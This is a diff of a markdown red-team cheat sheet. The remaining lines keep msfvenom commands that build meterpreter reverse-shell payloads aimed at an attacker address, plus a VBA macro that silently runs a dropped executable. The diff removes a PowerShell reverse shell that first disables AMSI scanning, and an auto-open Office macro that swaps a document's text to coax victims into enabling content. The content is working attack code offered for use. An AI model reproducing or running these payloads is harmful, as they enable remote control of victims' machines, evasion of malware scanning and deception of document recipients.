@@ -504,12 +504,6 @@ msfvenom -p generic/custom PAYLOADFILE=bin/meterp-https-x64.bin LHOST=10.10.14.4
 msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.49.83 LPORT=80 PrependFork=true -f c
 ```
 
-#### Powershell Reverse Shell
-
-```
-$lf=[Ref].Assembly.GetTypes();Foreach($up in $lf) {if ($up.Name -like "*iUtils") {$c=$up}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*InitFailed") {$f=$e}};$f.SetValue($null,$true);$TCPClient = New-Object Net.Sockets.TCPClient('192.168.49.83', 80);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()
-```
-
 ### Initial Compromise
 
 #### HTML Smuggling
@@ -550,26 +544,6 @@ Sub MyMacro()
 	exePath = ActiveDocument.Path + "\msfstaged.exe"
 	Wait (2)
 	Shell exePath, vbHide
-End Sub
-```
-
-##### Office VBA Text Replace Macro
-
-Use for appearances- find & replace text within the document to further coerce the victim to enable document content. 
-
-```
-Sub Document_Open()
-    SubPage
-End Sub
-
-Sub AutoOpen()
-    SubPage
-End Sub
-
-Sub SubPage()
-    ActiveDocument.Content.Select
-    Selection.Delete
-    ActiveDocument.AttachedTemplate.AutoTextEntries("TheDoc").Insert Where:=Selection.Range, RichText:=True
 End Sub
 ```
 
